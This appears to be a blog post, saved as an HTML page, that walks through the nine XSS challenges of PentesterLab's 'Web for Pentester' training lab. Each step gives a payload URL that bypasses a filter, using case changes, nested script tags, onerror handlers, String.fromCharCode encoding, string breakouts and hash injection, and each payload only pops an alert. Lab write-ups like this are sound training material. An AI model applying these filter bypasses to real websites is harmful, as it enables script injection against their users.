<!DOCTYPE html>
<html>
<head>
    <title>Web for Pentester XSS! // multiplex3r.github.io</title>

    <meta charset="utf-8">
    <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    
    
    

        <meta property="og:title" content="Web for Pentester XSS!" />
    <meta property="og:description" content="" />
    <meta property="og:type" content="website" />
    <meta property="og:locale" content="en" />
    <meta property="og:url" content="https://multiplex3r.github.io/posts/2015-02-15-web-for-pentester-xss/" />
    

    <link rel="shortcut icon" href="/favicon.ico">

    <link href="https://multiplex3r.github.io/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
    <link href="https://multiplex3r.github.io/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">

    <link rel="stylesheet" href="https://multiplex3r.github.io/css/style.css">
    

    <meta name="generator" content="Hugo 0.74.3" />
</head>


<body>
<div id="container">
    <header id="header">
    <div id="header-outer" class="outer">
        <div id="header-inner" class="inner">
            <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
            <a id="logo" class="logo-text" href="https://multiplex3r.github.io/">multiplex3r.github.io</a>
            <nav id="main-nav">
                
                <a class="main-nav-link" href="/about/">About me</a>
                
                <a class="main-nav-link" href="/tags/">Tags</a>
                
            </nav>
            <nav id="sub-nav">
                <div id="search-form-wrap">
                </div>
            </nav>
        </div>
    </div>
</header>

    <section id="main" class="outer">
        <article class="article article-type-post" itemscope itemprop="blogPost">
    <div class="article-inner">
        
        <header class="article-header">
            <h1 class="article-title" itemprop="name">Web for Pentester XSS!</h1>
        </header>
        
        <div class="article-meta">
            <a href="/posts/2015-02-15-web-for-pentester-xss/" class="article-date">
                <time datetime='2015-02-15T17:53:09.000&#43;11:00' itemprop="datePublished">2015-02-15</time>
            </a>
            
            
            
        </div>
        <div class="article-entry" itemprop="articleBody">
            <p>Hi Y&rsquo;all! Sorry, it&rsquo;s been a long while since my last post.. I&rsquo;ve been doing CTP and changing jobs and what not, so been pretty busy. This post is about the challenge series <a href="https://pentesterlab.com/exercises/web_for_pentester/">Web for Pentester</a> specifically the XSS challenges,  made by <a href="https://twitter.com/snyff">Louis Nyffenegger</a> @ <a href="https://pentesterlab.com">PentesterLab</a>.</p>
<p>Beware, spoilers!</p>
<!-- raw HTML omitted -->
<p>So you want to get into web apps? Well, PentesterLab is a place for you to go and learn enough Web App Kung Fu to get started. I highly recommend this series of challenges. And for those who are particularly new to security, the PentesterLab <a href="https://pentesterlab.com/bootcamp">Bootcamp</a>. It gives you a guide to what you should learn and in what order.</p>
<p>For those of you who want to jump in the deep end, go ahead and download &ldquo;Web for Pentester I&rdquo; and boot it up. It has a bunch of different challenges:</p>
<ul>
<li>XSS</li>
<li>SQLi</li>
<li>Directory Tranversal</li>
<li>File Includes</li>
<li>Code Injection</li>
<li>Command Injection</li>
<li>LDAP attacks</li>
<li>File Upload</li>
<li>XML Attacks</li>
</ul>
<h3 id="xss">XSS</h3>
<p>For this post we will just be covering the XSS portion of Web for Pentester.</p>
<h4 id="example-1">Example 1</h4>
<p>This is a great into, in the address bar you can see that there is a name parameter with the default value of &lsquo;hacker&rsquo;.</p>
<p><code>http://pentesterlab/xss/example1.php?name=hacker</code></p>
<p>Lets see if there is any input sanitisation going on&hellip;</p>
<p><code>http://pentesterlab/xss/example1.php?name=hacker&lt;script&gt;alert('xss')&lt;/script&gt;</code></p>
<p>And there we have it. Our first XSS was successful.</p>
<p>![fig2](<a href="https://multiplex3r.github.io/images/10_11_2014/fig2.png">https://multiplex3r.github.io/images/10_11_2014/fig2.png</a> =250x)</p>
<h4 id="example-2">Example 2</h4>
<p>This challenge steps it up a little and has some filtering in place..</p>
<p><code>http://pentesterlab/xss/example1.php?name=hacker&lt;script&gt;alert('xss')&lt;/script&gt;</code></p>
<p>Initially I used the string from the last challenge, however this xss payload doesn&rsquo;t trigger and the page renders the name like so &ldquo;Hello hackeralert(&lsquo;xss&rsquo;)&rdquo;.</p>
<p>To defeat this filtering we could try to bypass it using a capital letter..</p>
<p><code>http://pentesterlab/xss/example2.php?name=hacker&lt;SCript&gt;alert('xss')&lt;/SCript&gt;</code></p>
<p>This works successfully.</p>
<h4 id="example-3">Example 3</h4>
<p>If we use the payload from the previous challenge we can see that there is now filtering on the word <code>&lt;script&gt;</code> regardless of case.</p>
<p>![Yo](<a href="https://multiplex3r.github.io/images/15_02_2015/xzibit.png">https://multiplex3r.github.io/images/15_02_2015/xzibit.png</a> =250x)</p>
<p>How about it we try wrapping the <code>&lt;script&gt;</code> call within a <code>&lt;script&gt;</code> call to see if it will trigger.</p>
<p><code>http://pentesterlab/xss/example3.php?name=hacker&lt;scri&lt;script&gt;pt&gt;alert('xss')&lt;/scri&lt;/script&gt;pt&gt;</code></p>
<p>Boom.</p>
<h4 id="example-4">Example 4</h4>
<p>In this example things are starting to get a bit trickier. Here any use of the word <code>script</code> will halt the web app.</p>
<p>So in this case we must use a payload that works around this..</p>
<p><code>http://pentesterlab/xss/example4.php?name=&lt;img src='nonexistant' onerror='alert(&quot;xss&quot;)' /&gt;</code></p>
<h4 id="example-5">Example 5</h4>
<p>In this example the word <code>alert</code> halts execution of the web app. In order to have our payload run we should use a different javascript function called <code>eval(String.fromCharCode())</code> what this does is convert decimal to ascii allowing us to bypass the preg_match function..</p>
<p><code>http://pentesterlab/xss/example5.php?name=&lt;script&gt;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))&lt;/script&gt;</code></p>
<h4 id="example-6">Example 6</h4>
<p>In this challenge we simply need to modify the javascript code like so..</p>
<p><code>http://pentesterlab/xss/example6.php?name=hacker&quot;;alert('xss');&quot;</code></p>
<p>This works because the browser will render the actual javascript then ours is inserted into the middle of theirs.</p>
<h4 id="example-7">Example 7</h4>
<p>In this example html encoding on special characters is added in which means you cannot use a double quote &lsquo;&quot;&rsquo;.. However, this string should work..</p>
<p><code>http://pentesterlab/xss/example7.php?name=hacker';alert('xss');'</code></p>
<p>Another one bites the dust..</p>
<h4 id="example-8">Example 8</h4>
<p>This example uses the PHP_SELF function which allows us to insert malicious javascript by closing off their code and executing our own..</p>
<p><code>http://pentesterlab/xss/example8.php/&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;</code></p>
<h4 id="example-9">Example 9</h4>
<p>For the last challenge the existing javascript is looking for the anchor <code>#</code> to write the url inside the page. We can exploit this by putting the xss payload inside the url after the anchor.</p>
<p><code>http://pentestlab/xss/example9.php#&lt;script&gt;alert('xss')&lt;/alert&gt;</code></p>
<p>There we have all the XSS examples from Web for Pentester I. Tune in next time for some of the other examples.</p>

        </div>

        
        
        <div class="article-toc" >
            <h3>Contents</h3>
            <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#xss">XSS</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
        
        

        


        
        <footer class="article-footer">
            <ul class="article-tag-list">
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/beginner">beginner
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/web">web
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/offence">offence
                    </a>
                </li>
                
                <li class="article-tag-list-item">
                    <a class="article-tag-list-link" href="https://multiplex3r.github.io//tags/xss">xss
                    </a>
                </li>
                
            </ul>
        </footer>
        
    </div>
    
<nav id="article-nav">
    
    <a href="/posts/2015-02-16-web-for-pentester-sqli/" id="article-nav-newer" class="article-nav-link-wrap">
        <div class="article-nav-title"><span>&lt;</span>&nbsp;
            Web for Pentester SQLi
        </div>
    </a>
    
    
    <a href="/posts/2014-11-22-openpgp-and-mac-os-x/" id="article-nav-older" class="article-nav-link-wrap">
        <div class="article-nav-title">OpenPGP and Mac OS X&nbsp;<span>&gt;</span></div>
    </a>
    
</nav>


</article>

        
    </section>
    <footer id="footer">
    <div class="outer">
        <div id="footer-info" class="inner">
            &copy; 2020 multiplex3r.github.io
            <br />
            Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with theme <a href="https://github.com/carsonip/hugo-theme-minos" target="_blank">Minos</a>
        </div>
    </div>
    

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/styles/tomorrow-night.min.css" integrity="sha256-2wL88NKUqvJi/ExflDzkzUumjUM73mcK2gBvBBeLvTk=" crossorigin="anonymous" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.9.0/highlight.min.js" integrity="sha256-KbfTjB0WZ8vvXngdpJGY3Yp3xKk+tttbqClO11anCIU=" crossorigin="anonymous"></script>
    <script>hljs.initHighlightingOnLoad();</script>

    
    <script>
        document.getElementById('main-nav-toggle').addEventListener('click', function () {
            var header = document.getElementById('header');
            if (header.classList.contains('mobile-on')) {
                header.classList.remove('mobile-on');
            } else {
                header.classList.add('mobile-on');
            }
        });
    </script>
</footer>

</div>
</body>
</html>
